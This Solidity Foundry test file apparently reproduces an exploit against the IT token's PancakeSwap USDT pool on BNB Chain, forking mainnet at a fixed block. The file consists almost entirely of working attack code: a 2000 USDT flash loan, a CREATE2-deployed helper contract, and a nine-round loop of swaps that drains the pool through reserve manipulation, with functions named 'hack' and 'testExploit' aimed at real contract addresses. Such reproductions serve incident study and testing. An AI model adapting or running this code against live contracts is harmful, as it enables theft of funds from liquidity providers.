// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";

IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
IERC20 constant IT = IERC20(0x1AC5Fac863c0a026e029B173f2AE4D33938AB473);

// USDT_USDC
IPancakePairV3 constant USDT_USDC_Pool = IPancakePairV3(
    0x36696169C63e42cd08ce11f5deeBbCeBae652050
);
IPancakePairV2 constant IT_USDT_Pool = IPancakePairV2(
    0x7265553986a81c838867aA6B3625ABA97B961f00
);

contract ITHelper {
    constructor(address _addr) {
        USDT.approve(_addr, type(uint256).max - 1);

        (bool success1, ) = _addr.call(
            abi.encodeWithSignature("feed(address)", address(this))
        );
        require(success1, "feed Error");

        (bool success2, ) = _addr.call(
            abi.encodeWithSignature("hack(address)", address(this))
        );
        require(success2, "hack Error");
    }
}

contract ITTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 36934258);
        deal(address(USDT), address(this), 0);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function getBytecode() public view returns (bytes memory bytecode) {
        bytes memory creationCode = type(ITHelper).creationCode;
        bytecode = abi.encodePacked(creationCode, abi.encode(address(this)));
    }

    function getAddress(
        bytes memory bytecode,
        uint _salt
    ) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                _salt,
                keccak256(bytecode)
            )
        );

        return address(uint160(uint(hash)));
    }

    function deploy(
        bytes memory bytecode,
        uint _salt
    ) public returns (address) {
        address addr;

        assembly {
            addr := create2(
                callvalue(),
                add(bytecode, 0x20),
                mload(bytecode),
                _salt
            )
        }

        return addr;
    }

    function testExploit() public {
        print("[Begin] USDT before", USDT.balanceOf(address(this)), 18);

        USDT_USDC_Pool.flash(address(this), 2000 ether, 0, hex"30783030");

        print("[End] USDT after", USDT.balanceOf(address(this)), 18);
    }

    function hack(address _addr) public {
        uint256 i = 0;
        while (i < 9) {
            USDT.transferFrom(_addr, address(IT_USDT_Pool), 2000 ether);

            uint256 usdt_balance = USDT.balanceOf(address(IT_USDT_Pool));

            (uint256 R0, uint256 R1, ) = IT_USDT_Pool.getReserves();
            uint256 balance0 = mintToPoolIfNeeded(R0 - 1) + 1;
            uint256 balance1 = ((R0 * R1 * 10000 * 10000) /
                ((balance0 * 10000) - (balance0 - 1) * 25) +
                2000 ether *
                25) / 10000;

            uint256 amount1Out = usdt_balance - balance1;
            IT_USDT_Pool.swap(
                R0 - 1, // amount0Out
                amount1Out - 1, // amount1Out
                _addr,
                ""
            );

            i++;
        }
    }

    function feed(address _addr) public {
        USDT.approve(_addr, type(uint256).max);
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee1;
        data;
        require(msg.sender == address(USDT_USDC_Pool), "not authorized");

        bytes memory bytecode = getBytecode();
        address helpAddress = getAddress(bytecode, 0);
        USDT.transfer(helpAddress, 2000 ether);

        deploy(bytecode, 0);

        USDT.transferFrom(
            helpAddress,
            address(this),
            USDT.balanceOf(address(helpAddress))
        );

        USDT.transfer(address(USDT_USDC_Pool), 2000 ether + fee0);
    }

    function max(uint256 a, uint256 b) external pure returns (uint256) {
        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) external pure returns (uint256) {
        return a <= b ? a : b;
    }

    function mintToPoolIfNeeded(uint256 amount) public view returns (uint256) {
        uint256 tokenUsdtRate;
        (uint112 R0, uint112 R1, ) = IT_USDT_Pool.getReserves();

        uint256 tokenReserve;
        uint256 usdtReserve;

        tokenReserve = uint256(R0);
        usdtReserve = uint256(R1);

        tokenUsdtRate =
            (uint256(usdtReserve) * (1e18)) /
            (uint256(tokenReserve));

        uint256 tokenReserveAfterBuy = tokenReserve - amount;
        uint256 usdtReserveAfterBuy = this.min(
            (tokenReserve * (usdtReserve)) / (tokenReserveAfterBuy),
            USDT.balanceOf(address(IT_USDT_Pool))
        );

        uint256 maxTokenUsdtRateAfterBuy = tokenUsdtRate +
            (tokenUsdtRate / (100));

        uint256 tokenMinReserveAfterBuy = (usdtReserveAfterBuy * (1e18)) /
            (maxTokenUsdtRateAfterBuy);

        if (tokenReserveAfterBuy >= tokenMinReserveAfterBuy) {
            return amount / 2;
        } else {
            return
                this.max(
                    tokenMinReserveAfterBuy - (tokenReserveAfterBuy),
                    amount / 2
                );
        }
    }
}
